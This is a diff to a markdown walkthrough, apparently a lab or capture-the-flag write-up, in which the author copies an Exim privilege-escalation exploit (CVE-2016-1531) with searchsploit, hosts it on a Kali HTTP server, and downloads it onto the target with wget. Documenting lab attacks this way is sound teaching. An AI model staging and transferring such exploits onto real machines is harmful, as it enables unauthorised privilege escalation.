@@ -216,3 +216,40 @@ The first result was exactly what I needed — Exim < 4.86.2 - Local Privilege E
 ```bash
 searchsploit -m 39535
 ```
+**Output:**
+
+```
+Exploit: Exim 4.84-3 - Local Privilege Escalation
+    URL: https://www.exploit-db.com/exploits/39535
+   Path: /usr/share/exploitdb/exploits/linux/local/39535.sh
+  Codes: CVE-2016-1531
+Verified: True
+File Type: POSIX shell script, ASCII text executable
+Copied to: /home/kali/39535.sh
+```
+
+## Step 4 — Downloading the Exploit to the Target
+
+Started Python HTTP Server on Kali
+
+```bash
+python3 -m http.server 80
+```
+### Downloaded the Exploit on the Target Machine
+
+```
+user@debian:~$ wget http://192.168.5.128/39535.sh
+```
+**Output:**
+
+```
+--2026-01-14 03:57:13--  http://192.168.5.128/39535.sh
+Connecting to 192.168.5.128:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 638 [application/x-sh]
+Saving to: "39535.sh"
+
+100%[================================================>] 638
+
+2026-01-14 03:57:13 (225 MB/s) - "39535.sh" saved [638/638]
+```
